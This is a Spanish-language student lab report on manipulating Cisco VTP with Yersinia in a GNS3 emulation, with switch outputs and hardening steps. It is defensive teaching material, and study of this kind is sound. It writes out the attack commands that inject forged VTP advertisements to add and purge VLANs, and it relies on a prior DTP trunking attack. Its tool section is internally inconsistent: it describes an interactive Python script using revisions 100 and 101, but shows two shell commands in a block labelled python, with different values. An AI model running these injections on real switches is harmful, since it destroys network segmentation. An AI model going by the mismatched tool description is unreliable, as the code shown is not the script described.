# 🛡️ Security Audit: VLAN Trunking Protocol (VTP) Manipulation & Database Overwrite

## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Ver Video de Demostración](https://youtu.be/t42qmHoLXLw)

---

## 🎯 1. Objetivo del Laboratorio

El propósito fundamental de esta auditoría es evaluar las debilidades de seguridad inherentes al protocolo **VTP (VLAN Trunking Protocol)** en entornos de Capa 2. La práctica demuestra cómo la falta de autenticación y la confianza implícita en los números de revisión de VTP permiten que un nodo no autorizado (**kali-1**) inyecte tramas falsificadas (*Summary Advertisements*) para alterar, añadir o purgar la base de datos de VLANs (`vlan.dat`) de todo un dominio de conmutadores Cisco, validando posteriormente las directivas de endurecimiento estricto.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en GNS3 operando bajo el segmento IP de gestión/auditoría **20.25.83.0/24**.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |        Sw-Core        |
                      |   VTP Server / Root   |
                      +-----------------------+
                                  | Gi0/0
                                  |
                                  | Gi0/0
                      +-----------------------+
                      |       Sw-Access       |
                      |      VTP Client       |
                      +-----------------------+
                         | Gi1/2           | Gi1/1
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Técnico   |     |   Cliente de Red   |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace Inicial | Dirección IP | Máscara de Red | Rol Operativo VTP Inicial |
| --- | --- | --- | --- | --- | --- |
| **Sw-Core** | Gi0/0 | Troncal | `20.25.83.2 /24` | `255.255.255.0` | Server (Dominio: Asignado en lab) |
| **Sw-Access** | Gi0/0 | Troncal | `20.25.83.3 /24` | `255.255.255.0` | Client (Dominio: Asignado en lab) |
| **Sw-Access** | Gi1/1 | Acceso (VLAN 83) | N/A | N/A | Puerto de Acceso - No transmite VTP |
| **Sw-Access** | Gi1/2 | Troncal Simulado | N/A | N/A | Enlace bajo ataque (Inyección VTP) |
| **kali-1** | e0 (`eth0`) | Auditoría | `20.25.83.99` | `255.255.255.0` | Inyector de Tramas con Yersinia |
| **PC1** | e0 | Acceso | `20.25.83.11` | `255.255.255.0` | Estación final (Afectada por cambios de VLAN) |

---

## 💻 3. Documentación Técnica del Script (`vtp_control.py`)

### Análisis Operativo del Código

El script implementa una automatización interactiva sobre el motor de Capa 2 de **Yersinia**. Su lógica se divide en dos fases críticas diseñadas para simular el ciclo de vida de una intrusión en la base de datos de conmutación:

1. **Fase de Inyección Superior (Paso 1):** El script solicita el dominio de red y los IDs de las VLANs. Envía una trama de actualización VTP con un **Configuration Revision Number** muy elevado (`Revision: 100`). Al recibir esto, tanto `Sw-Access` como `Sw-Core` asumen que es la información más reciente y sobrescriben su base de datos, forzando la creación de las dos nuevas VLANs.
2. **Fase de Purga Dinámica (Paso 2):** Al pulsar `ENTER`, el script incrementa deliberadamente el número de revisión (`Revision: 101`) pero excluye la segunda VLAN de la lista. Los switches procesan la nueva trama, manteniendo la primera VLAN y eliminando de forma inmediata la segunda de todo el dominio de red.

### Código de la Herramienta

```python
sudo yersinia vtp -attack 4 -i eth0 -d "lab-seguridad" -v 100 -n "VLAN_A" -r 50
sudo yersinia vtp -attack 4 -i eth0 -d "lab-seguridad" -v 200 -n "VLAN_B" -r 51

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Requisito Crítico Inicial

*VTP solo transmite sus publicaciones a través de enlaces Trunk.* Asegúrese de que la interfaz de **kali-1** (`Gi1/2` del switch) esté operando en modo Troncal (ejecutando previamente el ataque DTP) antes de lanzar este script.

### Paso 1: Establecer la Línea Base

Verifique el estado actual del número de revisión y las VLANs existentes en **Sw-Access**:

```text
Sw-Access# show vtp status | include Revision
Configuration Revision: 2
Sw-Access# show vlan brief

```

### Paso 2: Ejecución e Interacción del Script

Corra el script con privilegios de superusuario en **kali-1**:

```bash
sudo python3 vtp_control.py

```

* Ingrese la interfaz (`eth0`), el dominio configurado en su topología, y las dos VLANs de prueba (ej. `831` y `832`).

### Paso 3: Verificación de la Inyección e Impacto (Fase 1)

Sin cerrar el script, valide la consola de **Sw-Access** o **Sw-Core**:

```text
Sw-Access# show vtp status | include Revision
Configuration Revision: 100
Sw-Access# show vlan brief

```

*(Se observará la aparición inmediata de las dos VLANs inyectadas de forma externa).*

### Paso 4: Ejecución de la Purga (Fase 2)

Presione `ENTER` en la terminal de Kali Linux. Vuelva a consultar el switch:

```text
Sw-Access# show vtp status | include Revision
Configuration Revision: 101

```

*La tabla de VLANs ahora reflejará únicamente la primera de ellas, demostrando la capacidad de remoción remota de segmentos.*

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

Para evitar que inyecciones de paquetes VTP de atacantes o switches mal configurados destruyan la segmentación lógica de la red corporativa, aplique las siguientes defensas esenciales:

### Configuración Defensiva (Copiar y pegar en Sw-Core y Sw-Access)

```text
configure terminal
!
! 1. Configurar una contraseña hash MD5 para el dominio VTP
vtp password ClaveSeguraITLA2026
!
! 2. Alternativa recomendada de Hardening: Cambiar el modo a Transparent o Desactivarlo
! (Esto evita que el conmutador sincronice o procese actualizaciones globales)
vtp mode transparent
end

```

### Comprobación de la Eficiencia de la Defensa

Si se intenta reejecutar la herramienta con las mitigaciones configuradas:

1. **Con Contraseña:** Los switches descartarán los paquetes inyectados por Yersinia debido a que el hash MD5 de la firma VTP no coincidirá, arrojando errores de *MD5 digest mismatch* en los logs internos.
2. **En Modo Transparent:** El switch ignorará el número de revisión del paquete malicioso, manteniendo intacta su base de datos de VLANs local:

```text
Sw-Access# show interfaces trunk
! Las VLANs locales permanecen consistentes y protegidas.

```

---

## ⚖️ 6. Aviso de Uso Académico

Este proyecto ha sido desarrollado exclusivamente bajo un entorno académico controlado dentro de los laboratorios del **ITLA** para la materia **Seguridad de Redes**. Queda estrictamente prohibido el uso de estas técnicas en redes de producción o infraestructuras externas sin los debidos permisos explícitos de los administradores de sistemas.

```
_

```
